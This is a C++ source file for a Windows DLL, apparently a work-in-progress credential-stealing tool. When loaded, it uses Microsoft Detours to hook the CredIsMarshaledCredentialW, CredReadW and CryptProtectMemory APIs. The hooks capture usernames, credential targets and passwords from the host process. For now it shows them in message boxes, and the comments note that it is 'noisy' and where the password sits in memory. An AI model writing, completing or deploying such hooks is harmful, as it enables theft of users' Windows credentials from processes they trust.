// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <wincred.h>
#include <detours.h>
#include <dpapi.h>
#define SECURITY_WIN32 
#include <Windows.h>
#include <security.h>
#include <subauth.h>
#include <sspi.h>
#pragma comment(lib, "Crypt32.lib") // didn't work i had to added manually 
#pragma comment(lib, "Secur32.lib")


using namespace std;
char CredIsMarshaledCredentialW_org_bytes[6] = {};
SIZE_T bytesWritten = 0;


/// <summary>
/// BOOL CredIsMarshaledCredentialW(
/// [in] LPCWSTR MarshaledCredential
/// );
/// </summary>
typedef BOOL(WINAPI* OrgiginalCredIsMarshaledCredentialW_type)(LPCWSTR MarshaledCredential);
OrgiginalCredIsMarshaledCredentialW_type OrgiginalCredIsMarshaledCredentialW = CredIsMarshaledCredentialW;


/// <summary>
/// BOOL CredReadW(
/// [in]  LPCWSTR      TargetName,
/// [in]  DWORD        Type,
/// [in]  DWORD        Flags,
/// [out] PCREDENTIALW* Credential
/// );
/// </summary>
typedef BOOL(WINAPI* OrgiginalCredReadW_type)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW* Credential);
OrgiginalCredReadW_type OrgiginalCredReadW = CredReadW;



/// <summary>
/// DPAPI_IMP BOOL CryptUnprotectMemory(
///     [in, out] LPVOID pDataIn,
///     [in]      DWORD  cbDataIn,
///     [in]      DWORD  dwFlags
/// );
/// </summary>
typedef BOOL(WINAPI* OrgiginalCryptProtectMemory_type)(void* pDataIn, DWORD  cbDataIn, DWORD  dwFlags);
OrgiginalCryptProtectMemory_type OrgiginaCryptProtectMemory = CryptProtectMemory;




string farprocToHex(FARPROC farProc) {
    char buffer[16];
    sprintf_s(buffer, "%x", (size_t)farProc);
    return buffer;//+ reinterpret_cast<uintptr_t>(farProc);

}

char* widetounixString(LPCWSTR TargetName) {
    char Target_buff[1024];
    WideCharToMultiByte(CP_ACP, 0, TargetName, -1, Target_buff, sizeof(Target_buff), nullptr, nullptr);
    return Target_buff;
}


// not working right now, rcx+4 contain the password after the second hit 
// but here it doesn't trigger (!!!)
__declspec(dllexport) BOOL CryptprotectMemory_fake(void* pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {
    // this is to check if there is a problem with messageboxA for some reason :( 
    system("echo test > c:\\temp\\iamhere.txt");
    MessageBoxA(NULL, "cryptoCalled", "pDataIn", MB_OK);
    // bool ret_value = OrgiginaCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
    // 
    // char pDataIn_buff[1024];
    // WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)pDataIn+4, -1, pDataIn_buff, sizeof(pDataIn_buff), nullptr, nullptr);
    // 
    // MessageBoxA(NULL, pDataIn_buff, "pDataIn", MB_OK);

    
    return OrgiginaCryptProtectMemory(pDataIn, cbDataIn, dwFlags);



    // return OrgiginaCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}

// this is very noisy, change it with something else, but it works atleast 
bool WINAPI CredReadW_fake(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW* Credential) {
    char Target_buff[1024];
    WideCharToMultiByte(CP_ACP, 0, TargetName, -1, Target_buff, sizeof(Target_buff), nullptr, nullptr);

    MessageBoxA(NULL, Target_buff, "Target", MB_OK);
    return OrgiginalCredReadW(TargetName, Type, Flags, Credential);

}




bool WINAPI CredIsMarshaledCredentialW_fake(LPCWSTR username) {
    char user_buffer[1024];
    WideCharToMultiByte(CP_ACP, 0, username, -1, user_buffer, sizeof(user_buffer), nullptr, nullptr);

    MessageBoxA(NULL, user_buffer, "username", MB_OK);
    // add memeory patch fix 
    return OrgiginalCredIsMarshaledCredentialW(username);
}




void start_attach() {

    HINSTANCE advapi32 = LoadLibraryA("advapi32.dll");
    FARPROC credIsMarshaledCredentialW_address = GetProcAddress(advapi32, "CredIsMarshaledCredentialW");

    // cout << credIsMarshaledCredentialW_address << endl;

    // ReadProcessMemory(GetCurrentProcess(), credIsMarshaledCredentialW_address, CredIsMarshaledCredentialW_org_bytes, sizeof(CredIsMarshaledCredentialW_org_bytes), &bytesWritten);



    MessageBoxA(NULL, "hello from dll", "hello", MB_OK);

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    // Hook MessageBoxA
    DetourAttach(&(PVOID&)OrgiginalCredIsMarshaledCredentialW, CredIsMarshaledCredentialW_fake);
    DetourAttach(&(PVOID&)OrgiginalCredReadW, CredReadW_fake);
    DetourAttach(&(PVOID&)OrgiginaCryptProtectMemory, CryptprotectMemory_fake);
    // Commit the transaction to activate the hook
    DetourTransactionCommit();


    MessageBoxA(NULL, "hello from dll2", "hello", MB_OK);

    // MessageBoxA(NULL, farprocToHex(credIsMarshaledCredentialW_address).c_str(), "hello", MB_OK);


    // void* CredIsMarshaledCredentialW_fake_address = &CredIsMarshaledCredentialW_fake;
    // char patch[6] = {};
    // memcpy_s(patch, 1, "\x68", 1);
    // memcpy_s(patch + 1, 4, &CredIsMarshaledCredentialW_fake_address, 4);
    // memcpy_s(patch + 5, 1, "\xc3", 1);

//    WriteProcessMemory(GetCurrentProcess(), (LPVOID)credIsMarshaledCredentialW_address, patch, sizeof(patch), &bytesWritten);

}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        start_attach();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

